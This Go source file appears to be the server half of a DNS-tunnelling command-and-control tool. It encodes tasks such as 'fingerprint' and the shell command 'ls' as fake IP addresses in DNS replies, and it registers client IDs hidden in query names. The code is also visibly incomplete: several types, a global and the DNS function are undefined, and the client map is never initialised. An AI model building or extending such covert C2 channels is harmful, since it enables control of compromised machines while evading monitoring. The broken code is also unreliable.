package main

import (
	"fmt"
	"strconv"
	"strings"
)

type server struct {
	clients map[string]client
	port    int
}

func bytesToIP(b []byte) string {
	return fmt.Sprintf("%d.%d.%d.%d", b[0], b[1], b[2], b[3])
}

func pad(tobepadded string) string {
	// pad to 4 bytes
	for len(tobepadded)%4 != 0 {
		tobepadded += " "
	}
	return tobepadded
}

func ipencode(str string) []string {
	str = pad(str)
	// split str into chunks of 4 bytes
	chunks := make([][]byte, len(str)/4)
	for i := 0; i < len(str)/4; i++ {
		chunks[i] = []byte(str[i*4 : i*4+4])
	}

	// convert each chunk to an IP
	ips := make([]string, len(chunks))
	for i, chunk := range chunks {
		ips[i] = bytesToIP(chunk)
	}

	return ips
}

func ipdecode(ips []string) string {
	// Join the lines with a .
	todecode := strings.Join(ips, ".")
	// Split the IPs by .
	ascii_character := strings.Split(todecode, ".")
	// Convert each ascii to a char
	chars := make([]string, len(ascii_character))
	for i, ascii := range ascii_character {
		chars[i] = string(func(a int, _ error) int { return a }(strconv.Atoi(ascii)))
	}
	// Join the chars
	return strings.Join(chars, "")
}

func incoming(query string) []string {
	query = strings.Split(query, ".")[0]
	switch query {
	case "ping":
		return ipencode("fingerprint")
	case "cmd":
		return ipencode("ls")
	default:
		if len(query) == 33 {
			(&serv).clients[strings.Split(query, "mynuts")[1]] = client{strings.Split(query, "mynuts")[1], []string{}, "0.0.0.0"}
		}
		return ipencode(fmt.Sprintf("Hello %s, How are you?", query))
	}
}

func Serve(port int) server {
	serv = server{}

	// Start the DNS server
	go DNS(port, serv)

	return serv
}
